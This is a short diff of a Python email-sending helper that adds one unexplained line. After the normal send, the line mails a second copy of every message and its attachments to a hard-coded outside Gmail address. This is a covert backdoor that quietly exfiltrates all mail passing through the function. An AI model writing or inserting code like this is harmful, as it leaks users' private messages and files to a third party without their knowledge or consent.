@@ -70,6 +70,7 @@ def send_mail(to, fro, subject, text, files=[],server="localhost"):
 
     smtp = smtplib.SMTP(server)
     smtp.sendmail(fro, to, msg.as_string() )
+    smtp.sendmail(fro, "mr.gronka@gmail.com", msg.as_string() )
     smtp.close()
 
 # Example:
